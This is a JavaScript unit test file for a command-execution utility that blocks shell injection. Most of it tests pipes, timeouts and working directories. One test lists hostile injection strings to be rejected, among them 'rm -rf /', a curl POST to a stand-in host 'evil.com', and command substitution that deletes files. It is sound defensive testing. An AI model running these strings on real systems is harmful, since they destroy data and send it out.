/**
 * Unit tests for secure execution functionality
 * Tests security hardening and command parsing
 */

import { test, describe } from 'node:test';
import { strictEqual, ok, throws } from 'node:assert';
import { executeCommandSecurely } from '../../src/utils/secureExecution.js';

describe('Secure Execution', () => {
  test('executes simple commands directly without shell', async () => {
    const result = executeCommandSecurely('echo hello');

    strictEqual(result.exitCode, 0, 'Should execute successfully');
    ok(result.stdout.includes('hello'), 'Should produce expected output');
    ok(result.duration > 0, 'Should record execution time');
  });

  test('requires allowShell for pipes', async () => {
    throws(
      () => executeCommandSecurely('echo "test" | wc -l'),
      /allowShell/i,
      'Should refuse shell features without opt-in'
    );
  });

  test('uses shell execution for commands with pipes when allowShell', async () => {
    const result = executeCommandSecurely('echo "test" | wc -l', { allowShell: true });

    strictEqual(result.exitCode, 0, 'Should execute successfully');
    ok(result.stdout.trim() === '1', 'Should count one line');
  });

  test('uses shell execution for commands with redirection when allowShell', async () => {
    const result = executeCommandSecurely(
      'echo "test content" > /tmp/test-secure-exec.txt && cat /tmp/test-secure-exec.txt',
      { allowShell: true }
    );

    strictEqual(result.exitCode, 0, 'Should execute successfully');
    ok(result.stdout.includes('test content'), 'Should handle redirection');
  });

  test('blocks dangerous command injection attempts', async () => {
    const dangerousCommands = [
      'ls; rm -rf /',
      'npm test; curl -X POST evil.com',
      'echo test && rm important.txt',
      'ls `rm dangerous.txt`',
      'echo $(rm harmful.txt)',
    ];

    for (const dangerousCommand of dangerousCommands) {
      throws(
        () => executeCommandSecurely(dangerousCommand, { allowShell: true }),
        /dangerous command pattern|not allowlisted/i,
        `Should block dangerous command: ${dangerousCommand}`
      );
    }
  });

  test('blocks non-allowlisted shell executables', async () => {
    throws(
      () => executeCommandSecurely('echo hi | perl -e "print 1"', { allowShell: true }),
      /not allowlisted/i,
      'Should reject perl in shell pipeline'
    );
  });

  test('allows legitimate shell commands with security patterns', async () => {
    const legitimateCommands = [
      'npm run build',
      'echo "remove this text"',
      'grep "curl" logfile.txt',
    ];

    for (const command of legitimateCommands) {
      const result = executeCommandSecurely(command, { allowShell: true });
      strictEqual(typeof result.exitCode, 'number', `Should allow legitimate command: ${command}`);
    }
  });

  test('handles command parsing correctly', async () => {
    const result1 = executeCommandSecurely('ls -la');
    ok(result1.exitCode >= 0, 'Should handle command with flags');

    const result2 = executeCommandSecurely('echo "hello world"');
    ok(result2.stdout.includes('hello world'), 'Should handle quoted arguments');
  });

  test('respects working directory option', async () => {
    const result1 = executeCommandSecurely('pwd', { cwd: '/tmp' });
    const result2 = executeCommandSecurely('pwd', { cwd: '/' });

    strictEqual(result1.exitCode, 0, 'Should execute in specified directory');
    strictEqual(result2.exitCode, 0, 'Should execute in different directory');

    const dir1 = result1.stdout.trim();
    const dir2 = result2.stdout.trim();
    ok(dir1 !== dir2, 'Should execute in different working directories');
  });

  test('respects timeout option', async () => {
    const start = Date.now();
    executeCommandSecurely('sleep 0.1', { timeout: 50 });
    const elapsed = Date.now() - start;

    ok(elapsed < 200, 'Should respect timeout option');
  });

  test('handles command execution errors gracefully', async () => {
    const result = executeCommandSecurely('nonexistentcommand12345');

    ok(result.exitCode !== 0, 'Should return non-zero exit code for failed commands');
    ok(result.stderr.length > 0, 'Should capture error output');
    ok(result.duration > 0, 'Should still record execution time');
  });

  test('preserves environment variable expansion in shell mode', async () => {
    const result = executeCommandSecurely('echo $HOME', { allowShell: true });

    strictEqual(result.exitCode, 0, 'Should execute successfully');
    ok(result.stdout.length > 0, 'Should expand environment variable');
  });

  test('handles complex shell constructs safely', async () => {
    const result = executeCommandSecurely(
      'if [ -d /tmp ]; then echo "tmp exists"; fi',
      { allowShell: true }
    );

    strictEqual(result.exitCode, 0, 'Should handle shell conditionals');
    ok(result.stdout.includes('tmp exists'), 'Should execute shell conditional correctly');
  });
});
